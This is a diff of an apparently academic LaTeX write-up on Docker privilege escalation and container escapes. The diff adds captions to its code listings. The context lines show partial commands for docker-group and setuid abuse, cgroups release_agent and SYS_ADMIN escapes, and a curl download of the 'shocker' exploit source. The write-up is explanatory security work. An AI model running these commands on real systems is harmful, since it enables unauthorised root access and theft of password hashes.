@@ -26,7 +26,7 @@ Every user in the \lstinline{docker} group is allowed to use Docker. This allows
 
 Lets say we want the password hash of user \lstinline{admin} on a system where we do not have \lstinline{sudo} privileges, but we are a member of the \lstinline{docker} group.
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Docker \lstinline{group} exploit example},captionpos=b]
 $ sudo -v
 Sorry, user unpriv may not run sudo on host.
 $ groups | grep -o docker
@@ -50,7 +50,7 @@ This is very useful in specific cases. For example, users should be able to chan
 
 If a system is misconfigured by having the \lstinline{setuid} bit set for the \lstinline{docker} binary, a user will be able to execute Docker as \lstinline{root} (the owner of \lstinline{docker}). Just like before, we can easily recreate this attack.
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Docker \lstinline{setuid} exploit example},captionpos=b]
 $ sudo -v
 Sorry, user unpriv may not run sudo on host.
 $ groups | grep -o docker
@@ -74,7 +74,7 @@ A simple example of this, is using a feature in \lstinline{cgroups}\cite{CGroup-
 \hfill
 
 We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm\cite{Felix-Wilhem-Tweet}.
-\begin{lstlisting}
+\begin{lstlisting}[caption={Docker escape using \lstinline{cgroups} (privileged)},captionpos=b]
 $ docker run -it --rm --privileged ubuntu:latest bash
 # d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 # mkdir -p $d/w;echo 1 >$d/w/notify_on_release
@@ -98,7 +98,7 @@ Giving containers extra capabilities, gives the container permission to perform 
 \subsubsection{\texorpdfstring{\lstinline{SYS_ADMIN}}{SYS_ADMIN}}
 The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{SYS_ADMIN} capability.
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Docker escape using \lstinline{SYS_ADMIN}},captionpos=b]
 $ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
 # mkdir /tmp/cgrp
 # mount -t cgroup -o rdma cgroup /tmp/cgrp
@@ -120,7 +120,7 @@ Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default cap
 
 \hfill
 
-\begin{lstlisting}
+\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}},captionpos=b]
 $ cd /tmp
 $ curl -O http://stealth.openwall.net/xSports/shocker.c
 $ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
